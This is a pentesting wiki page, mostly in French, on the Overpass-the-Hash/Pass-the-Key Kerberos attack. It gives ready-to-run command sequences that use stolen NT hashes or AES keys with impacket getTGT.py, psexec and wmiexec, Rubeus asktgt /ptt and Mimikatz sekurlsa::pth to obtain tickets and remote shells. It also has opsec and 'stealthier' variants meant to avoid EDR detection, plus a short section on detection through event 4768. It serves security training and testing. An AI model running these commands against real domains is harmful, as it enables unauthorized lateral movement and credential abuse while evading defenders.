# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

L’attaque **Overpass The Hash/Pass The Key (PTK)** est conçue pour les environnements où le protocole NTLM traditionnel est restreint et où l’authentification Kerberos prend le dessus. Cette attaque exploite le hash NTLM ou les clés AES d’un utilisateur pour solliciter des tickets Kerberos, permettant un accès non autorisé aux ressources d’un réseau.

Plus précisément :

- **Over-Pass-the-Hash** signifie généralement convertir le **NT hash** en un TGT Kerberos via la clé Kerberos **RC4-HMAC**.
- **Pass-the-Key** est la version plus générique où vous disposez déjà d’une clé Kerberos telle que **AES128/AES256** et demandez directement un TGT avec celle-ci.

Cette différence est importante dans les environnements durcis : si **RC4 est désactivé** ou n’est plus pris en charge par le KDC, le **NT hash seul ne suffit pas** et vous avez besoin d’une **clé AES** (ou du mot de passe en clair pour la dériver).

Pour exécuter cette attaque, la première étape consiste à obtenir le hash NTLM ou le mot de passe du compte de l’utilisateur ciblé. Une fois cette information obtenue, un Ticket Granting Ticket (TGT) pour le compte peut être récupéré, permettant à l’attaquant d’accéder aux services ou aux machines auxquels l’utilisateur a des permissions.

Le processus peut être lancé avec les commandes suivantes :
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Pour les scénarios nécessitant AES256, l’option `-aesKey [AES key]` peut être utilisée :
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` prend aussi en charge la demande d’un **service ticket directement via un AS-REQ** avec `-service <SPN>`, ce qui peut être utile lorsque vous voulez un ticket pour un SPN spécifique sans TGS-REQ supplémentaire :
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
De plus, le ticket acquis peut être utilisé avec divers outils, notamment `smbexec.py` ou `wmiexec.py`, élargissant ainsi la portée de l'attaque.

Les problèmes rencontrés tels que _PyAsn1Error_ ou _KDC cannot find the name_ sont généralement résolus en mettant à jour la bibliothèque Impacket ou en utilisant le hostname au lieu de l'adresse IP, afin d'assurer la compatibilité avec le Kerberos KDC.

Une séquence de commandes alternative utilisant Rubeus.exe démontre une autre facette de cette technique :
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Cette méthode reflète l’approche **Pass the Key**, en mettant l’accent sur la prise de contrôle et l’utilisation directe du ticket à des fins d’authentification. En pratique :

- `Rubeus asktgt` envoie lui-même la **raw Kerberos AS-REQ/AS-REP** et n’a **pas** besoin de droits admin, sauf si vous voulez cibler une autre session de logon avec `/luid` ou en créer une séparée avec `/createnetonly`.
- `mimikatz sekurlsa::pth` injecte le material d’identifiants dans une session de logon et **touche donc LSASS**, ce qui nécessite généralement local admin ou `SYSTEM` et est plus bruyant du point de vue d’un EDR.

Exemples avec Mimikatz :
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Pour se conformer à l’operational security et utiliser AES256, la commande suivante peut être appliquée :
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` est pertinent car le trafic généré par Rubeus diffère légèrement du Kerberos natif de Windows. Note aussi que `/opsec` est conçu pour le trafic **AES256** ; l’utiliser avec RC4 nécessite généralement `/force`, ce qui en grande partie annule l’intérêt, car **RC4 dans les domaines modernes est lui-même un signal fort**.

## Detection notes

Chaque requête TGT génère **l’event `4768`** sur le DC. Dans les versions actuelles de Windows, cet event contient des champs plus utiles que ne le mentionnent les anciens writeups :

- `TicketEncryptionType` indique quel enctype a été utilisé pour le TGT émis. Les valeurs typiques sont `0x17` pour **RC4-HMAC**, `0x11` pour **AES128**, et `0x12` pour **AES256**.
- Les events mis à jour exposent aussi `SessionKeyEncryptionType`, `PreAuthEncryptionType`, ainsi que les enctypes annoncés par le client, ce qui aide à distinguer la **vraie dépendance à RC4** des faux positifs liés aux valeurs par défaut héritées.
- Voir `0x17` dans un environnement moderne est un bon indice que le compte, l’hôte ou le chemin de fallback du KDC autorise encore RC4 et est donc plus compatible avec Over-Pass-the-Hash basé sur le NT-hash.

Microsoft réduit progressivement le comportement RC4-par-défaut depuis les mises à jour de durcissement Kerberos de novembre 2022, et la guidance publiée actuelle est de **retirer RC4 comme enctype supposé par défaut pour les AD DCs d’ici la fin du T2 2026**. D’un point de vue offensif, cela signifie que **Pass-the-Key avec AES** est de plus en plus la voie fiable, tandis que le classique **OpTH uniquement NT-hash** échouera de plus en plus souvent dans les environnements durcis.

Pour plus de détails sur les types de chiffrement Kerberos et le comportement associé des tickets, voir :

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Each logon session can only have one active TGT at a time so be careful.

1. Create a new logon session with **`make_token`** from Cobalt Strike.
2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.

You can achieve a similar isolation from Rubeus itself with a sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Cela évite d’écraser le TGT de la session actuelle et est généralement plus sûr que d’importer le ticket dans votre session de connexion existante.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
